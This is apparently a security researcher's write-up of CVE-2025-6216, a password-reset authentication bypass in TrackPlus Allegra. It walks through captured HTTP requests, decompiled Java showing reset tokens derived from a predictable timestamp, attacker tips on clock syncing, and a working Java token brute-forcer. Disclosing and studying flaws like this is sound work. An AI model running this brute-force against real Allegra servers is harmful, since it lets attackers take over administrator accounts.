<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>CVE-2025-6216: Authentication Bypass In TrackPlus Allegra | zdaylabs</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #1a1f2e 0%, #2d3748 50%, #1e3a5f 100%);
      color: #dcdcdc;
      line-height: 1.6;
      padding: 0 2rem;
      min-height: 100vh;
    }
    
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 2rem 0 1rem;
      border-bottom: 1px solid #333;
    }
    
    .logo {
      font-size: 1.5rem;
      font-weight: bold;
      color: #ffffff;
    }
    
    nav a {
      margin: 0 1rem;
      text-decoration: none;
      color: #ccc;
      font-size: 0.95rem;
    }
    
    nav a:hover {
      color: #fef200;
    }
    
    .socials a {
      margin-left: 1rem;
      color: #999;
      font-size: 1.2rem;
      text-decoration: none;
    }
    
    main {
      max-width: 1000px;
      margin: 2rem auto;
      padding: 0 1rem;
    }
    
    h1 {
      font-size: 2.5rem;
      color: #fff;
      margin-bottom: 1rem;
    }
    
    h2 {
      color: #fef200;
      font-size: 1.8rem;
      margin: 2rem 0 1rem;
      border-bottom: 2px solid #333;
      padding-bottom: 0.5rem;
      text-align: left;
    }
    
    h3 {
      color: #fef200;
      font-size: 1.4rem;
      margin: 1.5rem 0 0.8rem;
    }
    
    p {
      margin-bottom: 1.2rem;
      color: #bbb;
    }
    
    code {
      color: #36d1dc;
      font-family: 'Courier New', monospace;
    }
    
    pre {
      background-color: #1e2329;
      border: 1px solid #333;
      border-radius: 4px;
      padding: 1rem;
      overflow-x: auto;
      margin: 1rem 0;
    }
    
    img {
      max-width: 100%;
      height: auto;
      border-radius: 8px;
      margin: 1rem 0;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
    }
    
    video {
      display: block;
      width: 100%;
      height: auto;
      border-radius: 8px;
      margin: 1rem 0;
      background: #000;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
    }
    
    ul {
      color: #bbb;
      margin-left: 1.5rem;
    }
    
    li {
      margin-bottom: 0.5rem;
    }
    
    a {
      color: #36d1dc;
      text-decoration: none;
    }
    
    a:hover {
      color: #fef200;
      text-decoration: underline;
    }
    
    .highlight {
      background: rgba(254, 242, 0, 0.1);
      color: #fef200;
      padding: 0.1rem 0.3rem;
      border-radius: 3px;
    }
    
    .cve-info {
      background: rgba(54, 209, 220, 0.1);
      border: 1px solid #36d1dc;
      border-radius: 8px;
      padding: 1.5rem;
      margin: 2rem 0;
    }
    
    .cve-info h3 {
      margin-top: 0;
      color: #36d1dc;
    }
    
    .severity {
      display: inline-block;
      padding: 0.3rem 0.8rem;
      border-radius: 4px;
      font-weight: bold;
      font-size: 0.9rem;
    }
    
    .severity.high {
      background: rgba(255, 69, 58, 0.2);
      color: #ff453a;
      border: 1px solid #ff453a;
    }
    
    footer {
      text-align: center;
      padding: 2rem 0;
      border-top: 1px solid #333;
      margin-top: 3rem;
      color: #999;
    }
    
    .social-links {
      margin-top: 1rem;
    }
    
    .social-links a {
      margin: 0 1rem;
      color: #36d1dc;
    }
  </style>
</head>
<body>
  <div id="navigation-placeholder"></div>
  <script src="navigation.js"></script>

  <main>
    <h1>CVE-2025-6216: Authentication Bypass In TrackPlus Allegra</h1>
    
    <div class="cve-info">
      <h3>CVE Information</h3>
      <p><strong>CVE ID:</strong> CVE-2025-6216</p>
      <p><strong>Severity:</strong> <span class="severity high">HIGH</span></p>
      <p><strong>CVSS Score:</strong> 9.8</p>
      <p><strong>Affected Product:</strong> TrackPlus Allegra</p>
      <p><strong>Vulnerability Type:</strong> Authentication Bypass</p>
      <p><strong>Discovery Date:</strong> June 2025</p>
    </div>

    <h2>Executive Summary</h2>
    <p>
      A critical authentication bypass vulnerability has been discovered in TrackPlus Allegra  8.1.3, allowing unauthenticated attackers to gain administrative access to the application.
    </p>

    <h2>Technical Details</h2>
<p>
      The specific flaw exists within the password recovery mechanism. The issue results from reliance upon a predictable value when generating a password reset token. An attacker can leverage this vulnerability to bypass authentication on the application
          </p>

    <h3>Vulnerability Analysis</h3>
    <p>
      The application uses a mixture of struts2 and Jakarta as Framework for the entire webapp.
      The REST apis are primarily written in Jakarta.

      So if you want to find the source code of an endpoint you can search something like:
      <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #b3ae60;">@POST</span>(<span style="color: #6aab73;">"/login"</span>)</pre></div>
      However , the requests originatig from the UI doesn't target the REST apis , matter of fact the REST apis are not even enabled by default.
    </p>
<p>
  Upon filling out the Login form we see the below request.
</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">POST</span> <span style="color: #6aab73;">/demo/logon!beforeLogin.action</span> <span style="color: #b3ae60;">HTTP/1.1</span>
<span style="color: #cf8e6d;">Host:</span> <span style="color: #bcbec4;">192.168.30.135:8082</span>
<span style="color: #cf8e6d;">User-Agent:</span> <span style="color: #bcbec4;">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0</span>
<span style="color: #cf8e6d;">Accept:</span> <span style="color: #bcbec4;">*/*</span>
<span style="color: #cf8e6d;">Accept-Language:</span> <span style="color: #bcbec4;">en-US,en;q=0.5</span>
<span style="color: #cf8e6d;">Accept-Encoding:</span> <span style="color: #bcbec4;">gzip, deflate</span>
<span style="color: #cf8e6d;">Content-Type:</span> <span style="color: #bcbec4;">application/x-www-form-urlencoded; charset=UTF-8</span>
<span style="color: #cf8e6d;">X-Requested-With:</span> <span style="color: #bcbec4;">XMLHttpRequest</span>
<span style="color: #cf8e6d;">Content-Length:</span> <span style="color: #bcbec4;">139</span>
<span style="color: #cf8e6d;">Origin:</span> <span style="color: #bcbec4;">http://192.168.30.135:8082</span>
<span style="color: #cf8e6d;">Connection:</span> <span style="color: #bcbec4;">keep-alive</span>
<span style="color: #cf8e6d;">Referer:</span> <span style="color: #bcbec4;">http://192.168.30.135:8082/demo/logoff.action?logOff=true&dc=1755430588839</span>
<span style="color: #cf8e6d;">Cookie:</span> <span style="color: #bcbec4;">JSESSIONID=03DF3A328A62E93CF33A06F9B6FB7227</span>
<span style="color: #cf8e6d;">Priority:</span> <span style="color: #bcbec4;">u=0</span>

<span style="color: #6aab73;">username=admin&password=000400010008000c000b&nonce=e4e75183e231444c8af0b6dc7f70ba4d&fromAjax=true&_dc=1755431276521&appType=&appActionName=</span></pre></div>
</p>
<p>
  Similarly when we trigger the forget Password we see the below Request.
</p>
<p>
  <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">POST</span> <span style="color: #6aab73;">/demo/resetPassword.action</span> <span style="color: #b3ae60;">HTTP/1.1</span>
<span style="color: #cf8e6d;">Host:</span> <span style="color: #bcbec4;">192.168.30.135:8082</span>
<span style="color: #cf8e6d;">User-Agent:</span> <span style="color: #bcbec4;">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0</span>
<span style="color: #cf8e6d;">Accept:</span> <span style="color: #bcbec4;">*/*</span>
<span style="color: #cf8e6d;">Accept-Language:</span> <span style="color: #bcbec4;">en-US,en;q=0.5</span>
<span style="color: #cf8e6d;">Accept-Encoding:</span> <span style="color: #bcbec4;">gzip, deflate</span>
<span style="color: #cf8e6d;">Content-Type:</span> <span style="color: #bcbec4;">application/x-www-form-urlencoded; charset=UTF-8</span>
<span style="color: #cf8e6d;">X-Requested-With:</span> <span style="color: #bcbec4;">XMLHttpRequest</span>
<span style="color: #cf8e6d;">Content-Length:</span> <span style="color: #bcbec4;">78</span>
<span style="color: #cf8e6d;">Origin:</span> <span style="color: #bcbec4;">http://192.168.30.135:8082</span>
<span style="color: #cf8e6d;">Connection:</span> <span style="color: #bcbec4;">keep-alive</span>
<span style="color: #cf8e6d;">Referer:</span> <span style="color: #bcbec4;">http://192.168.30.135:8082/demo/logoff.action?logOff=true&dc=1755430588839</span>
<span style="color: #cf8e6d;">Cookie:</span> <span style="color: #bcbec4;">JSESSIONID=03DF3A328A62E93CF33A06F9B6FB7227</span>

<span style="color: #6aab73;">email=admin%40test.com&fromAjax=true&_dc=1755431380425&appType=&appActionName=</span></pre></div>
</p>
<p>
  Checking the struts-track.xml we can see that the resetPassword action is mapped to com.aurel.track.user.ResetPasswordAction class
</p>
<p>
    <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;">&lt;<span style="color: #cf8e6d;">action</span> <span style="color: #b3ae60;">name</span>=<span style="color: #6aab73;">"resetPassword"</span> <span style="color: #b3ae60;">class</span>=<span style="color: #6aab73;">"com.aurel.track.user.ResetPasswordAction"</span>&gt;
&lt;<span style="color: #cf8e6d;">result</span> <span style="color: #b3ae60;">name</span>=<span style="color: #6aab73;">"failure"</span> <span style="color: #b3ae60;">type</span>=<span style="color: #6aab73;">"redirectAction"</span>&gt;logoff&lt;/<span style="color: #cf8e6d;">result</span>&gt;
&lt;<span style="color: #cf8e6d;">result</span> <span style="color: #b3ae60;">name</span>=<span style="color: #6aab73;">"resetPassword"</span>&gt;/pages/application/borderLayout.jsp&lt;/<span style="color: #cf8e6d;">result</span>&gt;
&lt;<span style="color: #cf8e6d;">result</span> <span style="color: #b3ae60;">name</span>=<span style="color: #6aab73;">"expired"</span>&gt;/pages/application/borderLayout.jsp&lt;/<span style="color: #cf8e6d;">result</span>&gt;
&lt;<span style="color: #cf8e6d;">interceptor-ref</span> <span style="color: #b3ae60;">name</span>=<span style="color: #6aab73;">"defaultNoAuth"</span> /&gt;
&lt;/<span style="color: #cf8e6d;">action</span>&gt;</pre></div>

  </p>
  <p>Below is the ResetPasswordAction.class execute() method definition</p>
  <p>
    <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public</span> <span style="color: #cf8e6d;">String</span> <span style="color: #56a8f5;">execute</span>() {
    <span style="color: #cf8e6d;">Locale</span> locale = <span style="color: #cf8e6d;">this</span>.servletRequest.<span style="color: #56a8f5;">getLocale</span>();
    <span style="color: #cf8e6d;">ArrayList</span>&lt;<span style="color: #cf8e6d;">LabelValueBean</span>&gt; errors = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ArrayList</span>&lt;<span style="color: #cf8e6d;">LabelValueBean</span>&gt;();
    <span style="color: #cf8e6d;">String</span> serverUrl = <span style="color: #cf8e6d;">ApplicationBean</span>.<span style="color: #56a8f5;">getInstance</span>().<span style="color: #56a8f5;">getServerAbsUrl</span>();
    <span style="color: #cf8e6d;">boolean</span> emailSent = <span style="color: #cf8e6d;">ProfileBL</span>.<span style="color: #56a8f5;">resetPassword</span>(<span style="color: #cf8e6d;">this</span>.email, serverUrl, <span style="color: #b3ae60;">true</span>, errors, locale);
    <span style="color: #cf8e6d;">if</span> (errors.<span style="color: #56a8f5;">isEmpty</span>()) {
        <span style="color: #cf8e6d;">StringBuilder</span> sb = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">StringBuilder</span>();
        sb.<span style="color: #56a8f5;">append</span>(<span style="color: #6aab73;">"{"</span>);
        <span style="color: #cf8e6d;">JSONUtility</span>.<span style="color: #56a8f5;">appendBooleanValue</span>(sb, <span style="color: #6aab73;">"success"</span>, <span style="color: #b3ae60;">true</span>);
        sb.<span style="color: #56a8f5;">append</span>(<span style="color: #6aab73;">"\"data\":{"</span>);
        <span style="color: #cf8e6d;">JSONUtility</span>.<span style="color: #56a8f5;">appendBooleanValue</span>(sb, <span style="color: #6aab73;">"emailSent"</span>, emailSent, <span style="color: #b3ae60;">true</span>);
        sb.<span style="color: #56a8f5;">append</span>(<span style="color: #6aab73;">"}");
        sb.<span style="color: #56a8f5;">append</span>(<span style="color: #6aab73;">"}");
        <span style="color: #cf8e6d;">JSONUtility</span>.<span style="color: #56a8f5;">encodeJSON</span>(<span style="color: #cf8e6d;">ServletActionContext</span>.<span style="color: #56a8f5;">getResponse</span>(), sb.<span style="color: #56a8f5;">toString</span>());
    } <span style="color: #cf8e6d;">else</span> {
        <span style="color: #cf8e6d;">JSONUtility</span>.<span style="color: #56a8f5;">encodeJSONErrorsExtJS</span>(<span style="color: #cf8e6d;">ServletActionContext</span>.<span style="color: #56a8f5;">getResponse</span>(), errors);
    }
    <span style="color: #cf8e6d;">return</span> <span style="color: #b3ae60;">null</span>;
}</pre></div>
  </p>

  <p>
    The way struts action works , is the action class will implement an execte() method and whenever this class is triggered this function gets triggered.
  </p>
  <p>Checking the above exeute method we can see that the profileBL.resetPassword() method is called.</p>
  <p><div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public static boolean</span> <span style="color: #56a8f5;">resetPassword</span>(<span style="color: #cf8e6d;">String</span> email, <span style="color: #cf8e6d;">String</span> serverURL, <span style="color: #cf8e6d;">boolean</span> automaticLoginAfterReset, <span style="color: #cf8e6d;">List</span>&lt;<span style="color: #cf8e6d;">LabelValueBean</span>&gt; errors, <span style="color: #cf8e6d;">Locale</span> locale) {
    <span style="color: #cf8e6d;">ApplicationBean</span> appBean = <span style="color: #cf8e6d;">ApplicationBean</span>.<span style="color: #56a8f5;">getInstance</span>();
    <span style="color: #cf8e6d;">if</span> (appBean == <span style="color: #b3ae60;">null</span>) {
        <span style="color: #cf8e6d;">LOGGER</span>.<span style="color: #56a8f5;">error</span>(<span style="color: #6aab73;">"No ApplicationBean found, this should never happen"</span>);
        <span style="color: #cf8e6d;">return</span> <span style="color: #b3ae60;">false</span>;
    }
    <span style="color: #cf8e6d;">boolean</span> haveErrors = <span style="color: #b3ae60;">false</span>;
    <span style="color: #cf8e6d;">boolean</span> emailSent = <span style="color: #b3ae60;">false</span>;
    <span style="color: #cf8e6d;">StringBuilder</span> errorsMessage = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">StringBuilder</span>();
    <span style="color: #cf8e6d;">try</span> {
        <span style="color: #cf8e6d;">List</span>&lt;<span style="color: #cf8e6d;">TPersonBean</span>&gt; personList = <span style="color: #cf8e6d;">PersonBL</span>.<span style="color: #56a8f5;">loadByEmail</span>(email);
        <span style="color: #cf8e6d;">List</span>&lt;<span style="color: #cf8e6d;">TPersonBean</span>&gt; loginnameArray = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ArrayList</span>&lt;&gt;(<span style="color: #b3ae60;">5</span>);
        <span style="color: #cf8e6d;">if</span> (personList != <span style="color: #b3ae60;">null</span>) {
            <span style="color: #cf8e6d;">LOGGER</span>.<span style="color: #56a8f5;">debug</span>(<span style="color: #6aab73;">"Now looping through responses..."</span>);
            <span style="color: #cf8e6d;">for</span> (<span style="color: #cf8e6d;">TPersonBean</span> person : personList) {
                <span style="color: #cf8e6d;">LOGGER</span>.<span style="color: #56a8f5;">debug</span>(<span style="color: #6aab73;">"Could retrieve person with login name {}"</span>, person.<span style="color: #56a8f5;">getLoginName</span>());
                loginnameArray.<span style="color: #56a8f5;">add</span>(person);
                <span style="color: #cf8e6d;">Date</span> texpDate = <span style="color: #cf8e6d;">PersonBL</span>.<span style="color: #56a8f5;">calculateTokenExpDate</span>((<span style="color: #cf8e6d;">Date</span>) <span style="color: #b3ae60;">null</span>);
                person.<span style="color: #56a8f5;">setTokenExpDate</span>(texpDate);
                <span style="color: #cf8e6d;">String</span> tokenPasswd = <span style="color: #cf8e6d;">DigestUtils</span>.<span style="color: #56a8f5;">sha256Hex</span>(<span style="color: #cf8e6d;">Long</span>.<span style="color: #56a8f5;">toString</span>(texpDate.<span style="color: #56a8f5;">getTime</span>()));
                person.<span style="color: #56a8f5;">setForgotPasswordKey</span>(tokenPasswd);
                person.<span style="color: #56a8f5;">setLastEdit</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Date</span>());
                <span style="color: #cf8e6d;">if</span> (!<span style="color: #cf8e6d;">GeneralSettings</span>.<span style="color: #56a8f5;">isDemoSite</span>() || person.<span style="color: #56a8f5;">getIsSysAdmin</span>()) {
                    <span style="color: #cf8e6d;">PersonBL</span>.<span style="color: #56a8f5;">saveSimple</span>(person);
                }
            }
        }
        <span style="color: #cf8e6d;">if</span> (loginnameArray.<span style="color: #56a8f5;">isEmpty</span>()) {
            haveErrors = <span style="color: #b3ae60;">true</span>;
            errorsMessage.<span style="color: #56a8f5;">append</span>(<span style="color: #56a8f5;">getText</span>(<span style="color: #6aab73;">"logon.newpassword.error.email.missing"</span>, locale) + <span style="color: #6aab73;">"\n"</span>);
        }
        <span style="color: #cf8e6d;">if</span> (!loginnameArray.<span style="color: #56a8f5;">isEmpty</span>() && !haveErrors) {
            <span style="color: #cf8e6d;">try</span> {
                emailSent = <span style="color: #56a8f5;">sendResetPassword</span>(loginnameArray, email, serverURL, automaticLoginAfterReset);
            } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">Exception</span> e) {
                <span style="color: #cf8e6d;">LOGGER</span>.<span style="color: #56a8f5;">error</span>(<span style="color: #cf8e6d;">ExceptionUtils</span>.<span style="color: #56a8f5;">getStackTrace</span>(e));
                errorsMessage.<span style="color: #56a8f5;">append</span>(<span style="color: #56a8f5;">getText</span>(<span style="color: #6aab73;">"logon.newpassword.error.email.sendFailed"</span>, locale) + <span style="color: #6aab73;">"\n"</span>);
                haveErrors = <span style="color: #b3ae60;">true</span>;
            }
        }
    } <span style="color: #cf8e6d;">catch</span> (<span style="color: #cf8e6d;">Exception</span> e2) {
        <span style="color: #cf8e6d;">LOGGER</span>.<span style="color: #56a8f5;">debug</span>(e2.<span style="color: #56a8f5;">getMessage</span>(), e2);
        <span style="color: #cf8e6d;">LOGGER</span>.<span style="color: #56a8f5;">error</span>(<span style="color: #6aab73;">"Cannot mail new password."</span>);
        errorsMessage.<span style="color: #56a8f5;">append</span>(<span style="color: #56a8f5;">getText</span>(<span style="color: #6aab73;">"logon.err.noDataBase"</span>, locale) + <span style="color: #6aab73;">"\n"</span>);
        haveErrors = <span style="color: #b3ae60;">true</span>;
    }
    <span style="color: #cf8e6d;">if</span> (haveErrors) {
        errors.<span style="color: #56a8f5;">add</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">LabelValueBean</span>(errorsMessage.<span style="color: #56a8f5;">toString</span>(), <span style="color: #6aab73;">"email"</span>));
    }
    <span style="color: #cf8e6d;">return</span> emailSent;
}</pre></div></p>
  <p>Above code block is the resetPassword() method of the ProfileBL class.</p>
    <p>On above <code>PersonBL.calculateTokenExpDate((Date) null);</code> calculates  the expiry date of the token, then <code>DigestUtils.sha256Hex(Long.toString(texpDate.getTime()));</code>
    encrypts the token with sha256 hash and stores it in the Person Object</p>
    <p>Later this token gets sent to the user via email.</p>

    <p>So far so good.</p>
    <p>
      However the problem lies in the calculateTokenExpDate().
      If you check the whole code , there has to some place where the secret token must be getting generated.
      calculateTokenExpDate() is the function where the token gets generated and an expiry date gets set.
      Below is how the calculateTokenExpDate() function looks like</p>

      <p>
        <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">public static</span> <span style="color: #cf8e6d;">Date</span> <span style="color: #56a8f5;">calculateTokenExpDate</span>(<span style="color: #cf8e6d;">Date</span> personCreatedDate) {
    <span style="color: #cf8e6d;">long</span> tokenExpInMillis = <span style="color: #b3ae60;">28800000L</span>;
    <span style="color: #cf8e6d;">if</span> (personCreatedDate != <span style="color: #b3ae60;">null</span>) {
        <span style="color: #cf8e6d;">return new</span> <span style="color: #cf8e6d;">Date</span>(personCreatedDate.<span style="color: #56a8f5;">getTime</span>() + tokenExpInMillis);
    }
    <span style="color: #cf8e6d;">return new</span> <span style="color: #cf8e6d;">Date</span>(<span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">Date</span>().<span style="color: #56a8f5;">getTime</span>() + tokenExpInMillis);
}</pre></div>
      </p>
<p>
  It uses java's date() functionto generate the secret token and add an expiry on it.
  This functiondoesn't generates cryptographic secure token and thus can be bruteforced with linear time .
  Couple of things that attackers has to keep in mind while exploting this kind of flaw is 
  1.The Timezone difference
  2.The time difference(Even difference in few seconds may disrtup the attack)

  Best way is to take a server in the same time zone and use a curl command that gets the server clock time and then sycn your attacker's server clock to the same.
</p>
    <h2>Proof of Concept</h2>
    <p>
      The following demonstrates how an attacker can bypass authentication:
    </p>

    <P>
      We can write a small java programme that is going to brute force the token and print it out.
    </P>
    <P>
      Token Brute Forcer
      <div style="background-color: #1e1f22; color: #bcbec4;"><pre style="font-family: 'JetBrains Mono',monospace; font-size: 9.8pt;"><span style="color: #cf8e6d;">import</span> java.util.*;
<span style="color: #cf8e6d;">import</span> org.apache.commons.codec.digest.DigestUtils;

<span style="color: #cf8e6d;">public class</span> TokenHashBruteForce {

    <span style="color: #cf8e6d;">public static void</span> <span style="color: #56a8f5;">main</span>(<span style="color: #cf8e6d;">String</span>[] args) {
        <span style="color: #808080;">// Current time</span>
        <span style="color: #cf8e6d;">long</span> now = <span style="color: #cf8e6d;">System</span>.<span style="color: #56a8f5;">currentTimeMillis</span>();
        
        <span style="color: #808080;">// 5 seconds back, 2 seconds forward</span>
        <span style="color: #cf8e6d;">long</span> start = now - (<span style="color: #b3ae60;">5</span> * <span style="color: #b3ae60;">1000</span>); <span style="color: #808080;">// 5 seconds</span>
        <span style="color: #cf8e6d;">long</span> end = now + (<span style="color: #b3ae60;">2</span> * <span style="color: #b3ae60;">1000</span>);   <span style="color: #808080;">// 2 seconds</span>

        <span style="color: #808080;">// 8 hours in milliseconds</span>
        <span style="color: #cf8e6d;">long</span> eightHoursMillis = <span style="color: #b3ae60;">28800000L</span>;

        <span style="color: #cf8e6d;">List</span>&lt;<span style="color: #cf8e6d;">String</span>&gt; hashes = <span style="color: #cf8e6d;">new</span> <span style="color: #cf8e6d;">ArrayList</span>&lt;&gt;();

        <span style="color: #cf8e6d;">for</span> (<span style="color: #cf8e6d;">long</span> time = start; time &lt;= end; time++) {
            <span style="color: #cf8e6d;">long</span> expirationTime = time + eightHoursMillis;
            <span style="color: #cf8e6d;">String</span> hash = <span style="color: #cf8e6d;">DigestUtils</span>.<span style="color: #56a8f5;">sha256Hex</span>(<span style="color: #cf8e6d;">Long</span>.<span style="color: #56a8f5;">toString</span>(expirationTime));
            hashes.<span style="color: #56a8f5;">add</span>(hash);
        }

        <span style="color: #808080;">// Output all hashes</span>
        <span style="color: #cf8e6d;">for</span> (<span style="color: #cf8e6d;">String</span> h : hashes) {
            <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(h);
        }

        <span style="color: #cf8e6d;">System</span>.out.<span style="color: #56a8f5;">println</span>(<span style="color: #6aab73;">"\nTotal Hashes generated: "</span> + hashes.<span style="color: #56a8f5;">size</span>());
    }
}</pre></div>
    </P>
<p>
  Combined with a python3 script to automate the forget password request we can attain complete auth Bypass.
  <video controls preload="metadata">
    <source src="videos/allegra_auth_bypass.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
  
</p>

<p>
  The exploit POC can can be found at : <a href="pocs/cve-2025-6216.py">POC.py</a>
</p>
    <h2>Affected Versions</h2>
    <p>
      This vulnerability affects TrackPlus Allegra versions ≤ 8.1.3.32. Organizations using affected versions should immediately apply security patches.
    </p>

    <h2>Timeline</h2>
    <ul>
      <li><strong>Discovery:</strong> June 2025</li>
      <li><strong>Vendor Notification:</strong> June 2025</li>
      <li><strong>CVE Assignment:</strong> June 2025</li>
    </ul>

    <h2>References</h2>
    <ul>
      <li><a href="https://alltena.com/en/resources/release-notes/release-notes-for-release-8-1-4-and-release-7-5-2">TrackPlus Security Advisory</a></li>
      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6216">National Vulnerability Database</a></li>
      <li><a href="https://www.zerodayinitiative.com/advisories/ZDI-25-410/">ZDI Advisory</a></li>
    </ul>

    <p><em>This research was conducted by the ZDaylabs security team as part of our ongoing commitment to improving application security.</em></p>
  </main>
</body>
</html>
